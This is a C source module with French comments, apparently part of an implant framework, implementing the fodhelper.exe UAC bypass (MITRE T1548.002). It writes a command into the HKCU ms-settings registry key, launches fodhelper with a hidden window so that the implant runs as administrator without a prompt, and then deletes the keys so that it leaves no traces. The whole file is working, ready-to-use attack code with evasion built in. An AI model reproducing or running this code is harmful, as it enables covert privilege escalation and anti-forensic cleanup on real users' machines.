/*
 * privesc.c — UAC Bypass via fodhelper.exe (T1548.002)
 *
 * Ce module implémente une élévation de privilèges sur Windows en contournant
 * le User Account Control (UAC) via l'exécutable fodhelper.exe.
 *
 * Principe :
 *   fodhelper.exe est un binaire Microsoft signé et marqué "auto-elevate" :
 *   Windows le lance en admin SANS afficher le prompt UAC. Avant de démarrer,
 *   fodhelper lit une commande shell depuis la clé de registre :
 *
 *     HKCU\Software\Classes\ms-settings\Shell\Open\command
 *
 *   Comme HKCU (HKEY_CURRENT_USER) est accessible en écriture par l'utilisateur
 *   courant sans privilèges admin, on peut y écrire n'importe quelle commande
 *   qui sera exécutée en administrateur.
 *
 * Étapes de l'attaque :
 *   1. Vérifie que l'exe cible existe (GetFileAttributesA).
 *   2. Crée la clé de registre ms-settings\Shell\Open\command.
 *   3. Écrit le chemin de l'exe dans la valeur (Default) de cette clé.
 *   4. Crée une valeur vide "DelegateExecute" (nécessaire pour déclencher
 *      le handler de commande au lieu de l'association de fichier).
 *   5. Lance fodhelper.exe avec ShellExecuteExA (fenêtre cachée).
 *   6. fodhelper s'auto-élève, lit la clé de registre, et exécute notre exe
 *      dans un contexte administrateur.
 *   7. Nettoie les clés de registre (suppression de toutes les clés créées).
 *
 * Prérequis :
 *   - L'utilisateur doit être membre du groupe local Administrateurs.
 *   - L'UAC doit être activé (paramètre par défaut sur Windows 10/11).
 *   - Ne fonctionne PAS si l'UAC est réglé sur "Toujours notifier"
 *     (niveau maximum).
 *
 * Commande de registre :
 *   La commande écrite dans la clé est de la forme :
 *     cmd /c cd /d "C:\chemin\dossier" && "C:\chemin\implant.exe"
 *   Le "cd /d" garantit que l'exe sera lancé depuis son propre dossier,
 *   ce qui permet à cfg_load(".env") de trouver le fichier de configuration.
 *
 * MITRE ATT&CK : T1548.002 — Abuse Elevation Control Mechanism: Bypass UAC
 */

#ifdef _WIN32

#include <windows.h>
#include <shellapi.h>   /* ShellExecuteExA, SHELLEXECUTEINFOA */
#include <stdio.h>
#include <string.h>

#include "privesc.h"

/* Clé de registre utilisée pour le bypass UAC fodhelper.
 * Chemin complet : HKCU\Software\Classes\ms-settings\Shell\Open\command */
#define REG_KEY "Software\\Classes\\ms-settings\\Shell\\Open\\command"

/*
 * cleanup_registry — Supprime toutes les clés de registre créées pour l'attaque.
 *
 * Nettoyage en profondeur : on supprime d'abord les valeurs (DelegateExecute
 * et Default), puis les clés dans l'ordre inverse de création (de la plus
 * profonde à la plus haute) pour ne laisser aucune trace.
 *
 * Les RegDeleteKeyA qui échouent (clé déjà supprimée ou inexistante) sont
 * silencieusement ignorés — ce n'est pas une erreur.
 */
static void cleanup_registry(void)
{
    HKEY hk;
    /* Ouvre la clé 'command' pour supprimer les valeurs à l'intérieur */
    if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_KEY, 0,
                      KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        RegDeleteValueA(hk, "DelegateExecute"); /* valeur DelegateExecute */
        RegDeleteValueA(hk, NULL);               /* valeur (Default) */
        RegCloseKey(hk);
    }
    /* Supprime les clés dans l'ordre inverse de création :
     *   command → Open → Shell → ms-settings */
    RegDeleteKeyA(HKEY_CURRENT_USER,
                  "Software\\Classes\\ms-settings\\Shell\\Open\\command");
    RegDeleteKeyA(HKEY_CURRENT_USER,
                  "Software\\Classes\\ms-settings\\Shell\\Open");
    RegDeleteKeyA(HKEY_CURRENT_USER,
                  "Software\\Classes\\ms-settings\\Shell");
    RegDeleteKeyA(HKEY_CURRENT_USER,
                  "Software\\Classes\\ms-settings");
}

/*
 * privesc_uac_bypass — Exécute un binaire en administrateur via fodhelper.
 *
 * Paramètre :
 *   exe_path — Chemin absolu de l'exécutable à lancer en admin.
 *              Typiquement le chemin de l'implant lui-même (auto-élévation).
 *
 * Retour :
 *   0        — Succès (fodhelper a été lancé et la commande exécutée).
 *  -1        — Erreur (exe introuvable, écriture registre échouée).
 *  -1000-err — ShellExecuteEx a échoué (err = GetLastError).
 */
int privesc_uac_bypass(const char *exe_path)
{
    HKEY  hk   = NULL;
    DWORD disp = 0;    /* disposition : clé créée ou ouverte */
    LONG  rc;

    /* Vérifie que l'exécutable cible existe avant de continuer.
     * GetFileAttributesA retourne INVALID_FILE_ATTRIBUTES si le fichier
     * n'existe pas ou est inaccessible. */
    if (GetFileAttributesA(exe_path) == INVALID_FILE_ATTRIBUTES)
        return -1;

    /* Extrait le dossier parent de l'exe pour le "cd /d".
     * Exemple : "C:\Users\toto\implant.exe" → "C:\Users\toto" */
    char work_dir[MAX_PATH];
    strncpy(work_dir, exe_path, MAX_PATH - 1);
    work_dir[MAX_PATH - 1] = '\0';
    char *last_sep = strrchr(work_dir, '\\');
    if (!last_sep) last_sep = strrchr(work_dir, '/');
    if (last_sep) *last_sep = '\0';

    /* Construit la commande qui sera écrite dans la clé de registre.
     * Format : cmd /c cd /d "dossier" && "exe"
     *   - cmd /c   : lance cmd.exe et se ferme après exécution
     *   - cd /d    : change de disque ET de dossier (le /d est nécessaire
     *                pour changer de partition, ex: C: → D:)
     *   - &&       : exécute l'exe seulement si le cd a réussi */
    char reg_cmd[MAX_PATH * 2];
    snprintf(reg_cmd, sizeof(reg_cmd),
             "cmd /c cd /d \"%s\" && \"%s\"", work_dir, exe_path);

    /* === Étape 1 : Création de la clé de registre ===
     * Crée HKCU\Software\Classes\ms-settings\Shell\Open\command
     * (crée aussi les clés parentes si elles n'existent pas). */
    rc = RegCreateKeyExA(HKEY_CURRENT_USER, REG_KEY, 0, NULL,
                         REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                         NULL, &hk, &disp);
    if (rc != ERROR_SUCCESS)
        return -1;

    /* === Étape 2 : Écriture de la commande dans (Default) ===
     * La valeur (Default) = NULL en premier argument de RegSetValueExA.
     * Type REG_SZ = chaîne de caractères null-terminée. */
    rc = RegSetValueExA(hk, NULL, 0, REG_SZ,
                        (const BYTE *)reg_cmd,
                        (DWORD)(strlen(reg_cmd) + 1));
    if (rc != ERROR_SUCCESS) {
        RegCloseKey(hk);
        cleanup_registry();
        return -1;
    }

    /* === Étape 3 : Création de la valeur DelegateExecute (vide) ===
     * Sans cette valeur, fodhelper utilise l'association de fichier standard
     * au lieu de lire la valeur (Default). La valeur vide ("") force
     * fodhelper à utiliser notre commande personnalisée. */
    rc = RegSetValueExA(hk, "DelegateExecute", 0, REG_SZ,
                        (const BYTE *)"", 1);
    RegCloseKey(hk);

    if (rc != ERROR_SUCCESS) {
        cleanup_registry();
        return -1;
    }

    /* Petit délai pour que le registre soit bien propagé avant le lancement.
     * Windows met parfois un court instant à rendre les clés visibles. */
    Sleep(200);

    /* === Étape 4 : Lancement de fodhelper.exe ===
     * ShellExecuteExA avec SEE_MASK_NOCLOSEPROCESS pour récupérer le handle
     * du processus (permet d'attendre qu'il se termine).
     * SW_HIDE = fenêtre cachée (pas de fenêtre cmd visible pour l'utilisateur). */
    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize       = sizeof(sei);
    sei.fMask        = SEE_MASK_NOCLOSEPROCESS;
    sei.lpFile       = "C:\\Windows\\System32\\fodhelper.exe";
    sei.nShow        = SW_HIDE;

    if (!ShellExecuteExA(&sei)) {
        int err = (int)GetLastError();
        cleanup_registry();
        /* Retourne -1000 - erreur pour distinguer cette erreur des autres.
         * Le code appelant peut retrouver GetLastError avec -(retour + 1000). */
        return -1000 - err;
    }

    /* Attend que fodhelper se termine (max 5 secondes).
     * Pendant ce temps, fodhelper lit la clé de registre et lance notre
     * commande en contexte administrateur. */
    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 5000);
        CloseHandle(sei.hProcess);
    }

    /* === Étape 5 : Nettoyage ===
     * Attend 500ms que le processus élevé soit bien démarré, puis supprime
     * toutes les clés de registre créées pour ne pas laisser de traces.
     * L'implant élevé est déjà en cours d'exécution à ce stade. */
    Sleep(500);
    cleanup_registry();

    return 0;
}

#else
/* Sur Linux, cette fonction n'a pas de sens (pas de UAC).
 * Retourne toujours -1 (non supporté). */
#include "privesc.h"
int privesc_uac_bypass(const char *exe_path)
{
    (void)exe_path;
    return -1;
}
#endif
